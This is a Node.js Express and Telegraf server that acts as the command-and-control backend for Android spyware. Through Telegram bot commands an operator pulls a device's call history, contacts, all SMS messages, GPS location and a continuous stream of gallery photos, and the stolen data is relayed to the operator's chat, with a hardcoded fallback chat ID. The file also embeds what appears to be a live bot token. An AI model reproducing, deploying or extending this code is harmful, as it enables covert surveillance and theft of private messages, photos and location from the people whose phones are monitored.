const express = require('express');
const { Telegraf } = require('telegraf');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());

// --- Setup Multer for file uploads ---
// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname); // Use original name sent by Android app
    }
});
const upload = multer({ storage: storage });

// --- Application State ---
// To track if a command was requested (e.g. 'none', 'ch', 'contact')
let pendingCommand = 'none';
let requestingChatId = null;

// --- Telegram Bot Setup ---
// Replace with your actual bot token
const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages\n/loc - Get current GPS location\n/ga - Get all gallery photos (continuous)'));

bot.command('ch', (ctx) => {
    // Acknowledge to the user
    ctx.reply('Command received. Waiting for the Android device to send the call history...');
    
    // Set the state so the Android app knows to send the data next time it checks
    pendingCommand = 'ch';
    requestingChatId = ctx.chat.id;
});

bot.command('contact', (ctx) => {
    // Acknowledge to the user
    ctx.reply('Command received. Waiting for the Android device to send the contacts list...');
    
    // Set the state so the Android app knows to send the data next time it checks
    pendingCommand = 'contact';
    requestingChatId = ctx.chat.id;
});

bot.command('as', (ctx) => {
    // Acknowledge to the user
    ctx.reply('Command received. Waiting for the Android device to send all SMS messages...');
    
    // Set the state so the Android app knows to send the data next time it checks
    pendingCommand = 'as';
    requestingChatId = ctx.chat.id;
});

bot.command('loc', (ctx) => {
    ctx.reply('Command received. Fetching GPS location from the Android device...');
    pendingCommand = 'loc';
    requestingChatId = ctx.chat.id;
});

bot.command('ga', (ctx) => {
    ctx.reply('Command received. The Android device will now continuously send gallery photos one-by-one until you send another command.');
    pendingCommand = 'ga';
    requestingChatId = ctx.chat.id;
});

// Launch bot
bot.launch().then(() => {
    console.log('Telegraf Bot launched!');
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// --- Express API Endpoints for Android App ---

// 1. Android calls this periodically to see if there's a command waiting
app.get('/check-command', (req, res) => {
    if (pendingCommand !== 'none') {
        // We have a command pending! Tell the app, then clear the pending state.
        res.json({ command: pendingCommand });
        pendingCommand = 'none';
    } else {
        // No command pending
        res.json({ command: 'none' });
    }
});

// 2. Android calls this to upload the file after seeing the 'ch' command
app.post('/upload-log', upload.single('document'), async (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }

    if (requestingChatId) {
        try {
            // Forward the document back to the Telegram chat that requested it
            await bot.telegram.sendDocument(requestingChatId, {
                source: req.file.path,
                filename: req.file.originalname 
            });
            console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
            res.status(200).send('File received and forwarded.');
        } catch (error) {
            console.error('Error forwarding to Telegram:', error);
            res.status(500).send('Error forwarding to Telegram.');
        } finally {
            // Clean up the uploaded file to save space
            fs.unlink(req.file.path, (err) => {
                if (err) console.error('Error deleting file:', err);
            });
            // Reset the chat id listener
            requestingChatId = null;
        }
    } else {
        // Fallback if we somehow got a file without a requesting chat ID
        console.warn('File received but no requestingChatId found.');
        
        // We can fall back to the default CHAT_ID the app originally used if we want,
        // or just ignore. We'll use the hardcoded one for safety.
        const FALLBACK_CHAT_ID = "1691680798";
        try {
            await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
                source: req.file.path,
                filename: req.file.originalname
            });
            res.status(200).send('File received and forwarded (fallback).');
        } catch (error) {
            console.error('Error forwarding to Telegram (fallback):', error);
            res.status(500).send('Error forwarding to Telegram (fallback).');
        } finally {
            fs.unlink(req.file.path, (err) => {
                if (err) console.error('Error deleting file:', err);
            });
        }
    }
});

// 3. Android calls this to upload GPS location after seeing the 'loc' command
app.post('/upload-location', express.json(), async (req, res) => {
    const { latitude, longitude } = req.body;
    if (!latitude || !longitude) {
        return res.status(400).send('Missing latitude or longitude.');
    }

    const mapsLink = `📍 Current Location:\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
    const chatId = requestingChatId;
    requestingChatId = null;

    if (chatId) {
        try {
            await bot.telegram.sendMessage(chatId, mapsLink);
            console.log(`Location sent to Telegram: ${latitude}, ${longitude}`);
            res.status(200).send('Location forwarded.');
        } catch (error) {
            console.error('Error sending location to Telegram:', error);
            res.status(500).send('Error forwarding location.');
        }
    } else {
        const FALLBACK_CHAT_ID = "1691680798";
        try {
            await bot.telegram.sendMessage(FALLBACK_CHAT_ID, mapsLink);
            res.status(200).send('Location forwarded (fallback).');
        } catch (error) {
            res.status(500).send('Error forwarding location (fallback).');
        }
    }
});

// Basic health check for Render
app.get('/', (req, res) => {
    res.send('Server is running properly.');
});

// --- Server Startup ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
